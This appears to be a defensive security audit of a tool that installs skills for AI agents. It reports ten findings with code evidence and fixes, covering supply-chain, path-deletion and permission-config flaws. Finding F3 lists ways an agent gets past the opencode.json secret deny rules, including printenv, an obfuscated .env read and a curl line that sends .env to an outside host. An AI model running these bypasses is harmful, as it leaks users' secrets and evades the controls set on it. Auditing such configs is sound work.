# Security review — junamis-agents-skills — 2026-11-05

Scope: the whole repository at `/home/ubuntu/projects/junamis-agents-skills`, including the
uncommitted working tree (`git diff` plus untracked `docs/`, `scripts/check-pack.mjs`,
`scripts/check-skills-lock.mjs`, `src/pinned-source.js`, `test/external.test.js`,
`test/pinned-source.test.js`, `todo.md`) and full git history.
Read-only review. No source, config, dependency, or workflow file was changed.

Method:

- Read every file in `src/`, `scripts/`, `.github/workflows/`, `library/`, and the untracked set.
- `git log --all`, `git for-each-ref`, `git config --local --list`, `git show` for history.
- Pattern scan of the tree and all refs for private-key headers, cloud keys, GitHub/npm/Slack/
  OpenAI token prefixes, and `scheme://user:pass@` URLs.
- `pnpm audit --json` and `pnpm audit --lockfile-only --json`.
- Cross-checked documented guarantees (`README.md`, `CHANGELOG.md`,
  `docs/external-skills-maintenance.md`, `AGENTS.md`) against the code that is supposed to
  enforce them.

Threat model used for severity: the package's job is to download third-party code and copy it
into directories that AI agents trust, then run a third-party scanner with the user's full
privileges. It is normally run *inside a project directory*, and that directory may be a
hostile clone. Anything project-controlled (cwd, registry config, project manifests, checked
out content) is treated as attacker-influenced.

## [high] F1 — The scanner is resolved from project-controlled registry config, with no integrity pin

Where: `src/external.js:34`, `src/external.js:136`

Why it matters: `skillsio` is fetched and executed with the user's privileges from whatever
registry the current directory's npm configuration names; a hostile repo can therefore supply
its own "scanner" that receives a local checkout and `-g`.

Evidence:

```js
// src/external.js:33-35
const INSTALLERS = {
  skillsio: ["pnpm", "--silent", "dlx", "skillsio@1.1.3"],
};
// src/external.js:136
const child = spawn(argv[0], argv.slice(1), { stdio: ["inherit", "pipe", "pipe"], shell: false });
```

The child inherits cwd and the whole environment (no `cwd:`, no `env:` in the spawn options).
`pnpm` reads `.npmrc` from the current project and honours `NPM_CONFIG_REGISTRY` /
`npm_config_registry`. Nothing in `external.js` overrides the registry, requires an integrity
hash, or verifies the download. `skillsio@1.1.3` is a version, not an integrity pin; a project
`.npmrc` that points at another registry makes the "pinned scanner" attacker-chosen. The same
inherited environment also means `--silent` (`external.js:34`) hides pnpm's own warnings.

Note the package's whole supply-chain story in `docs/external-skills-maintenance.md:16` and
`README.md:83` rests on this scanner being the trusted component.

Suggested fix: pass an explicit `cwd` outside the project, strip `NPM_CONFIG_*`/`npm_config_*`
and `PNPM_*`, set `--registry` to a constant, and pin the scanner by integrity
(`skillsio@1.1.3` + known tarball SHA, or vendor it / verify `sha256` before execution).

## [high] F2 — Library install trusts manifest paths, so a project-supplied manifest can delete or overwrite arbitrary files

Where: `src/library-install.js:151-163` (selection), `src/library-install.js:189-191` (delete),
`src/library-install.js:109-113` (unvalidated read), `src/library-install.js:20-23` (project manifest path)

Why it matters: for project scope the install record lives inside the project
(`<project>/.junamis/installed/library-<agent>.json`), which is attacker-controlled in a cloned
repo; its `files[].path` values are used as filesystem paths with no containment check, so a
crafted record turns `install-library`/`sync`/`init --with-library` into arbitrary file deletion
(and, via the rollback backup, arbitrary file reads that are later written back).

Evidence:

```js
// src/library-install.js:20-23
if (scope === "project") return join(projectDir, ".junamis", "installed", `library-${agentId}.json`);
// src/library-install.js:151-152
const planned = new Set(files.map((f) => f.path));
const stale = previous.files.map((f) => f.path).filter((p) => !planned.has(p));
// src/library-install.js:159-162
const last = previousHash.get(p);
const current = sha256(await readFile(p));
if (last !== undefined && current !== last && !force) staleConflicts.push(p);
else removableStale.push(p);
// src/library-install.js:189-191
for (const p of removableStale) {
  if (existsSync(p)) await rm(p, { force: true });
}
```

Any entry with `sha256` omitted (`last === undefined`) is unconditionally `removableStale`.
Paths are never compared against `sharedDocsDir`, `target.projectSkillsDir`,
`target.projectAgentsDir`, or `homedir()`. `applyLibraryInstall` is reached from
`src/cli.js:357-358` (`sync`) and `src/cli.js:203-223` (`install-library`), both of which accept
`--scope project`.

Suggested fix: validate the manifest before use — every entry must be an absolute path inside
one of the four managed roots, must carry a well-formed 64-hex `sha256`, and must not be a
symlink; reject the whole manifest (fail closed) otherwise.

## [high] F3 — Shipped `opencode.json` allows unrestricted `bash`, which voids every read/edit secret deny rule

Where: `opencode.json:668` (bash allow), `opencode.json:8-141` (read denylist), `opencode.json:142-665` (edit denylist)

Why it matters: the package advertises this file as the secret-access control
(`README.md:34`, `README.md:66`, `CHANGELOG.md:30`, `src/cli.js:36`), but the single most
powerful tool is allowed for all commands. The deny rules are substring globs on the command
text, so they are bypassed by anything that does not spell the filename literally.

Evidence:

```json
// opencode.json:667-669
"bash": {
  "*": "allow",
  "*.env*": "deny",
```

Concrete bypasses that match no pattern in `opencode.json:669-712`:

- `printenv` / `env` — dumps every secret in the agent's environment.
- `node -e '...readFileSync(...)'`, `python3 -c ...` — arbitrary file read and write.
- `cat "$(printf '\056env')"` — the path never appears in the command string.
- `curl -F f=@.env https://…` — exfiltration in one step.

Related gaps in the same config: `.git-credentials` and `.gitconfig` are denied
(`opencode.json:118-119`) but `.git/config` is not, even though remote URLs with embedded tokens
are the common pattern; and `blog`/`edit` denials never apply to `bash` at all.

Suggested fix: change `bash` to `"*": "ask"` (matching the `"*": "ask"` default at
`opencode.json:7`), or remove the `bash` block so the default applies. Treat the glob denylist
as a nice-to-have, not as the control. Add `.git/config` and `.git/modules/*` to `read`.

## [high] F4 — The "scan is never skipped / critical findings still prompt" guarantee is unenforced

Where: `src/external.js:103` (`-y`), `src/external.js:19-20` + `src/external.js:143` + `src/external.js:155` (string-match detection), `src/external.js:14` (claim)

Why it matters: the only evidence that a scan was declined is an exact English sentence in the
third-party process output, while the same command line auto-answers prompts with `-y`. A
wording/locale/colour change, or a scanner build where `-y` accepts the scan prompt, silently
turns a cancelled or bypassed scan into a successful global install.

Evidence:

```js
// src/external.js:14 (module comment)
// - Nothing is answered on the user's behalf. stdin is inherited.
// src/external.js:19-20
const SECURITY_CANCELLATION = "Installation cancelled due to security concerns";
const SECURITY_CANCELLATION_EXIT = 125;
// src/external.js:103
return [...runner, "add", source, "--agent", skillsioAgent, "--skill", ...skills, "-y", "-g"];
// src/external.js:143,155
securityCancellationDetected ||= combinedOutput.includes(SECURITY_CANCELLATION);
resolve(installerExitCode(code, securityCancellationDetected ? SECURITY_CANCELLATION : ""));
```

`-y` is passed unconditionally and there is no test asserting its interaction with the scanner's
security prompt. `docs/external-skills-maintenance.md:29` acknowledges that prompt and decline
behaviour must be verified per scanner version, but nothing in the code or CI enforces it. A
declined scan that exits 0 without that exact text is counted as success
(`src/external.js:234-237`).

Suggested fix: drop `-y` (or replace it with the narrowest non-interactive flag the scanner
documents for *non-security* prompts), and treat "scan result could not be parsed" as a
failure, not a success. Record the scanner's exit code semantics in a test with a fixture.

## [medium] F5 — `treeSha` verification accepts any 40-hex object, including a symlink/blob

Where: `src/pinned-source.js:123-127`, `src/external.js:106-111`

Why it matters: `rev-parse --verify HEAD:<folder>` resolves whatever object sits at that path.
If the pinned commit stores `skills/x` as a symlink or a regular file, the result is a *blob*
OID; it is 40 hex characters, so `SHA.test` passes and the value is compared to `treeSha` as if
it were a directory hash. A symlinked skill directory is then checked out as a live symlink and
handed to the scanner, so it can resolve outside the temporary checkout.

Evidence:

```js
// src/pinned-source.js:123-127
const folder = skillPath.slice(0, -"/SKILL.md".length);
const revision = folder ? `HEAD:${folder}` : "HEAD^{tree}";
const sha = await runCheckedGit(["-C", directory, "rev-parse", "--verify", revision], timeout);
if (!SHA.test(sha)) throw new Error("git returned an invalid tree SHA for " + skillPath);
return sha;
```

Suggested fix: require `git cat-file -t <sha>` to be `tree`, and reject any `120000` (symlink)
entry inside the verified folder via `git ls-tree -r`.

## [medium] F6 — The checkout is never proven to be at the locked commit

Where: `src/pinned-source.js:46-52`, `src/pinned-source.js:98-117`, `src/external.js:217`

Why it matters: `README.md:83` says the installer "verifies each locked commit", and
`docs/external-skills-maintenance.md:16` says it "fetches the exact commit". The code fetches a
SHA from a remote and then checks out `FETCH_HEAD` without asserting `rev-parse HEAD === ref`;
the only binding between lock and disk is the per-skill tree hash, which covers the skill folder
and nothing else in the checkout.

Evidence:

```js
// src/pinned-source.js:50-51
["-C", directory, "fetch", "--quiet", "--depth=1", "origin", ref],
["-C", directory, "checkout", "--quiet", "--detach", "FETCH_HEAD"],
```

Suggested fix: after checkout, require `git rev-parse HEAD` to equal `ref` and fail otherwise;
log the verified SHA.

## [medium] F7 — Timeouts kill with SIGTERM only and resolve before the child exits

Where: `src/external.js:157-162`, `src/pinned-source.js:76-81`, `src/external.js:229-233`

Why it matters: on timeout the promise resolves while the child (and `pnpm`'s own children) may
still be running. The caller then reports failure, retries the installer, and in the
`pinned-source` path `rm`s the checkout directory. A scanner that ignores SIGTERM can keep
writing into the global skills directory after the CLI has said the install failed.

Evidence:

```js
// src/external.js:157-162
const timer = timeout > 0
  ? setTimeout(() => {
    try { child.kill("SIGTERM"); } catch { /* ignore */ }
    finish(124);
  }, timeout)
  : null;
```

There is no `SIGKILL` escalation, no `child.killed`/exit wait, and no process-group kill.

Suggested fix: `detached: true` + `process.kill(-pid, "SIGTERM")`, then `SIGKILL` after a grace
period, and resolve only on `close`.

## [medium] F8 — Unbounded stdout/stderr buffering while fetching from a hostile remote

Where: `src/pinned-source.js:83-84`

Why it matters: a malicious or misbehaving remote can stream unlimited bytes on stderr (progress,
server messages) and the whole stream is accumulated into a JS string. The 300 s timeout bounds
time, not volume, so this is a memory-exhaustion path in the installer.

Evidence:

```js
// src/pinned-source.js:83-84
child.stdout.on("data", (chunk) => { stdout += chunk.toString(); });
child.stderr.on("data", (chunk) => { stderr += chunk.toString(); });
```

Suggested fix: cap each buffer (for example 64 KiB, keep the tail) and abort the child on
overflow; `git` errors only need the last lines.

## [medium] F9 — `webfetch` allowlist includes plaintext HTTP and user-controlled wildcard subdomains

Where: `opencode.json:826-837`, also `opencode.json:854-885`

Why it matters: the file is documented as a "trusted developer docs" allowlist
(`README.md:34`, `CHANGELOG.md:30`). `*.vercel.app` and `*.netlify.app` are shared hosting:
anyone can publish there, so those rules amount to "fetch any attacker page automatically".
Every allowed host is also allowed over `http://`, so content can be modified in transit.

Evidence:

```json
// opencode.json:826-829
"https://vercel.app/*": "allow",
"https://*.vercel.app/*": "allow",
"http://vercel.app/*": "allow",
"http://*.vercel.app/*": "allow",
```

Suggested fix: remove `http://` entries, drop the `*.vercel.app` / `*.netlify.app` (and any
other user-content host) wildcards, and keep the catch-all at `ask` as it is today
(`opencode.json:1750`).

## [medium] F10 — Third-party GitHub Actions are pinned by mutable major tags, in workflows that hold write tokens

Where: `.github/workflows/release.yml:22,27,32,70`, `.github/workflows/publish.yml:23,28,34`, `.github/workflows/ci.yml:19,20,23`

Why it matters: `release.yml` runs with `permissions: contents: write`
(`.github/workflows/release.yml:14-15`) and `publish.yml` holds `packages: write` plus
`NODE_AUTH_TOKEN` (`.github/workflows/publish.yml:14-16,46-49`). Every action is referenced by a
moving major tag (`actions/checkout@v6`, `pnpm/action-setup@v5`,
`softprops/action-gh-release@v2`), so a compromised or retargeted tag executes with those
credentials.

Evidence:

```yaml
# .github/workflows/release.yml:69-75
- name: Create GitHub Release
  uses: softprops/action-gh-release@v2
  with:
    tag_name: ${{ github.event.inputs.release_tag || github.ref_name }}
```

Positive notes (verified, no action needed): no `pull_request_target`; `ci.yml` is
`contents: read`; every `run:` that uses the dispatch input does so through `env:` and quotes it
(`release.yml:40-42,48-49`, `publish.yml:42-44`), so there is no expression/shell injection in
the tag path, and `release:check` validates the tag against `package.json` before the release is
created (`scripts/release-check.mjs:56-60`).

Suggested fix: pin every `uses:` to a full commit SHA (Dependabot can keep them current), and
scope `contents: write` to the single release step.

## Authorization

No routes, handlers, or per-user data paths exist in this package (CLI only), so check 3 of the
skill does not apply. The nearest equivalent — "who may write where" — is covered by F2
(untrusted manifest paths) and F3 (agent permission config).

## Unverified / not reported

- Whether `skillsio@1.1.3`'s `-y` actually answers its security prompt, and whether it maps the
  `--skill <name>` argument to the same folder whose tree was verified. Both require the
  scanner's source; `docs/external-skills-maintenance.md:29` already says this must be checked.
  F4 and F6 describe the gap without assuming the answer.
- Whether OpenCode's permission engine matches `read`/`edit`/`bash` globs against basenames or
  full paths. F3 does not depend on the answer (`printenv` and `node -e` match neither form).
- `opencode.json:4-5` points `skills`/`instructions` at `~/.agents/skills` and
  `~/.junamis/library`, while `external_directory` is `deny` (`opencode.json:666`). That is a
  functional inconsistency (the agent may be unable to read its own installed library) rather
  than a vulnerability; it is called out here so nobody "fixes" it by deleting the deny rule.
